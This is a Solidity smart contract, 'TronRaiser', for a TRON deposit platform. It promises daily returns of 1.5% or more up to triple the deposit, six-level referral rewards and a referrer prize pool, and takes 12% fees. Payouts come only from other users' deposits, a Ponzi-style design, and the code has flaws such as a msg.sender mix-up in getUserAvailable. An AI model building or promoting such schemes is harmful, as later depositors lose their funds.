//SourceUnit: TronRaiser.sol

pragma solidity 0.5.10;

contract TronRaiser {

    using SafeMath for *;

    uint constant public INVEST_MIN_AMOUNT = 200 trx;
    uint constant public DEPOSITS_MAX = 100;
    uint constant public TIME_STEP = 1 days;
    uint constant public PROJECT_FEE = 1000;                // 10%
    uint constant public SUPPORT_FEE = 200;                 //  2%
    uint constant public POOL_PERCENT = 300;                //  3% 
    uint constant public BASE_PERCENT = 150;                //1.5%
    uint constant public MAX_COMMUNITY_PERCENT = 100;       //  1%
    uint constant public COMMUNITY_BONUS_STEP = 1000;       //1000;
    uint constant public MAX_HOLD_PERCENT = 500;            //0.5%
    uint constant public PERCENTS_DIVIDER = 10000;

    uint[] public POOL_BONUS = [30, 25, 20, 15, 10];
    uint[] public REFERRAL_PERCENTS = [500, 300, 200, 100, 100, 300];

    mapping(uint => mapping(address => uint128)) public usersRefsDepositsSum;

    address payable private projectAddr;
    address payable private supportAddr;
    address payable private owner;

    struct User {
        address upline;
        Deposit[] deposits;
        uint64 refBonus;
        uint64 poolBonus;
        uint64 bonusWithdrawn;
        uint32 checkpoint;
        uint32 comCheckpoint;
        uint24[6] refs;
    }

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint32 startTime;
    }

    uint public cycle = 0;
    uint public totalUsers;
    uint public totalDeposits;
    uint public totalWithdrawn;
    uint public poolBalance;
    uint32 public lastDrawTime;

    mapping(uint8 => address) public poolTop; 
    mapping (address => User) internal users;
    
    event Newbie(address addr);
    event NewDeposit(address indexed addr, uint amount);
    event FeePayed(address indexed user, uint amount);
    event ReferralBonus(address indexed upline, address indexed referral, uint level, uint amount);
    event PoolPayout(address indexed addr, uint amount, uint win, uint place);
    event Withdraw(address indexed addr, uint amount);
    event WithdrawCommission(address indexed addr, uint amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner!");
        _;
    }

    constructor(address payable project, address payable support) public {
        require(!isContract(project));
        projectAddr = project;
        supportAddr = support;
        owner = msg.sender;
        lastDrawTime = uint32(block.timestamp);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function deposit(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);      
        require(msg.value >= INVEST_MIN_AMOUNT, "Min.investment can't be less than 200 trx");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");

        uint toDeposit = msg.value;
        uint projectFee = toDeposit.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint supportFee = toDeposit.mul(SUPPORT_FEE).div(PERCENTS_DIVIDER);
        projectAddr.transfer(projectFee);
        supportAddr.transfer(supportFee);

        emit FeePayed(msg.sender, projectFee.add(supportFee));

        if (user.upline == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender ) {
            user.upline = referrer;              
        }
        
        if (user.deposits.length == 0) {
            totalUsers++;
            user.checkpoint = uint32(block.timestamp);
            user.comCheckpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        if (user.upline != address(0)) {
            address upline = user.upline;
            for (uint8 i = 0; i < 6; i++) {
                if(upline == address(0)) break;
                if(isActive(upline)) {
                    uint reward = toDeposit.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    users[upline].refBonus = uint64(uint(users[upline].refBonus).add(reward));
                    users[upline].refs[i]++;
                    emit ReferralBonus(upline, msg.sender, i, reward);
                }               
                upline = users[upline].upline;
            }
        }

        user.deposits.push(Deposit(uint64(toDeposit), 0, uint32(block.timestamp)));
        totalDeposits = totalDeposits.add(toDeposit);

        if (lastDrawTime + 7 days < block.timestamp) poolDraw();
        poolDeposit(msg.sender, toDeposit);

        emit NewDeposit(msg.sender, toDeposit);
    }

    function withdraw() public {
        User storage user = users[msg.sender];
        uint toSend;
        uint dividends;

        uint userPercentRate = getUserPercentRate(msg.sender).add(getCommunityBonusRate());

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {

                if (user.deposits[i].startTime > user.checkpoint) {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].startTime)))
                        .div(TIME_STEP);

                } else {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);
                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3)) {
                    dividends = (uint(user.deposits[i].amount).mul(3)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                toSend = toSend.add(dividends);
            }
        }

        require(toSend > 0, "User has no dividends");

        uint contractBalance = address(this).balance;
        if (contractBalance < toSend) {
            toSend = contractBalance;
        }

        msg.sender.transfer(toSend);

        user.checkpoint = uint32(block.timestamp);
        totalWithdrawn = totalWithdrawn.add(toSend);

        emit Withdraw(msg.sender, toSend);
    }

    function withdrawComm() public {
        User storage user = users[msg.sender];
        require(((block.timestamp.sub(uint(user.comCheckpoint))).div(TIME_STEP)) > 0 || user.bonusWithdrawn == 0, "24 Hours not passed");

        uint toSend;
        if(user.refBonus > 0) {
            toSend = uint(user.refBonus);
            user.refBonus = 0;
        }

        if(user.poolBonus > 0) {
            toSend = toSend.add(uint(user.poolBonus));
            user.poolBonus = 0;           
        }

        require(toSend > 0, "User has no commission");

        uint contractBalance = address(this).balance;
        if (contractBalance < toSend) {
            toSend = contractBalance;
        }

        msg.sender.transfer(toSend);

        user.bonusWithdrawn = uint64(uint(user.bonusWithdrawn).add(toSend));
        user.comCheckpoint = uint32(block.timestamp);
        totalWithdrawn = totalWithdrawn.add(toSend);

        emit WithdrawCommission(msg.sender, toSend);
    }

    function getUserAvailable(address userAddr) public view returns (uint) {
        User storage user = users[userAddr];

        uint userPercentRate = getUserPercentRate(msg.sender).add(getCommunityBonusRate());

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {
                if (user.deposits[i].startTime > user.checkpoint) {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].startTime)))
                        .div(TIME_STEP);
                } else {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);
                }
                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3)) {
                    dividends = (uint(user.deposits[i].amount).mul(3)).sub(uint(user.deposits[i].withdrawn));
                }
                totalDividends = totalDividends.add(dividends);
            }
        }
        return totalDividends;
    }


    function poolDeposit(address userAddr, uint toDeposit) private {
        poolBalance = poolBalance.add(toDeposit.mul(POOL_PERCENT).div(PERCENTS_DIVIDER));

        address upline = users[userAddr].upline;

        if(upline == address(0)) return;

        if(isActive(upline)) {
            usersRefsDepositsSum[cycle][upline] = uint128(uint(usersRefsDepositsSum[cycle][upline]).add(toDeposit));

            for(uint8 i = 0; i < POOL_BONUS.length; i++) {
                if(poolTop[i] == upline) break;

                if(poolTop[i] == address(0)) {
                    poolTop[i] = upline;
                    break;
                }
                if(usersRefsDepositsSum[cycle][upline] > usersRefsDepositsSum[cycle][poolTop[i]]) {
                    for(uint8 j = i + 1; j < POOL_BONUS.length; j++) {
                        if(poolTop[j] == upline) {
                            for(uint8 k = j; k <= POOL_BONUS.length; k++) {
                                poolTop[k] = poolTop[k + 1];
                            }
                            break;
                        }
                    }
                    for(uint8 j = uint8(POOL_BONUS.length - 1); j > i; j--) {
                        poolTop[j] = poolTop[j - 1];
                    }
                    poolTop[i] = upline;

                    break;
                }
            }
        }
    }

    function poolDraw() private {    
        lastDrawTime = uint32(block.timestamp);
        cycle++;

        uint drawAmount = poolBalance.div(10);

        for(uint8 i = 0; i < POOL_BONUS.length; i++) {
            if(poolTop[i] == address(0)) break;
            uint win = drawAmount.mul(POOL_BONUS[i]).div(100);
            users[poolTop[i]].poolBonus = uint64(uint(users[poolTop[i]].poolBonus).add(win));
            poolBalance = poolBalance.sub(win);

            emit PoolPayout(poolTop[i], uint(usersRefsDepositsSum[cycle-1][poolTop[i]]), win, i);
        }

        for(uint8 i = 0; i < POOL_BONUS.length; i++) {
            poolTop[i] = address(0);
        }
    }

    function getUserPercentRate(address userAddr) public view returns (uint) {
        User storage user = users[userAddr];
        if (isActive(userAddr)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return BASE_PERCENT.add(timeMultiplier);
        } else {
            return BASE_PERCENT;
        }
    }

    function getCommunityBonusRate() public view returns (uint) {
        uint communityBonusRate = totalUsers.div(COMMUNITY_BONUS_STEP).mul(1);

        if (communityBonusRate < MAX_COMMUNITY_PERCENT) {
            return communityBonusRate;
        } else {
            return MAX_COMMUNITY_PERCENT;
        }
    }

    function isActive(address userAddr) public view returns (bool) {
        User storage user = users[userAddr];
        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(3);
    }

    function getUserDeposits(address userAddr, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddr];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            start[index] = uint(user.deposits[i-1].startTime);
            index++;
        }
        return (amount, withdrawn, start);
    }

    function getContractBalance() public view returns (uint) {
		return address(this).balance;
	}

    function poolTopInfo() view external returns(address[5] memory addrs, uint[5] memory deps) {
        for(uint8 i = 0; i < POOL_BONUS.length; i++) {
            addrs[i] = poolTop[i];
            deps[i] = usersRefsDepositsSum[cycle][poolTop[i]];
        }
    }

    function usersCycleRefDepositsSum(uint poolCycle, address userAddr) view external returns(uint) {
        return usersRefsDepositsSum[poolCycle][userAddr];
    }

    function getUserStats(address userAddr) public view returns (uint, uint, uint, uint, uint32, uint32, uint24[6] memory, address) {
        User storage user = users[userAddr];
        return (
          user.refBonus,
          user.poolBonus,
          user.bonusWithdrawn,
          user.deposits.length,
          user.checkpoint,
          user.comCheckpoint,
          user.refs,
          user.upline
       );
    }

    function getGlobalStats() public view returns(uint, uint, uint, uint, uint, address[] memory, uint[] memory, uint32) {
        address[] memory poolTopTmp = new address[](5);
        uint[] memory refsDepositsSumTmp = new uint[](5);

        for(uint8 i = 0; i < 5; i++) {
            poolTopTmp[i] = poolTop[i];
            refsDepositsSumTmp[i] = uint(usersRefsDepositsSum[cycle][poolTop[i]]);
        }
        return (
          totalDeposits,
          totalWithdrawn,
          totalUsers,
          cycle,
          poolBalance,
          poolTopTmp,
          refsDepositsSumTmp,
          lastDrawTime
        );
    }
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}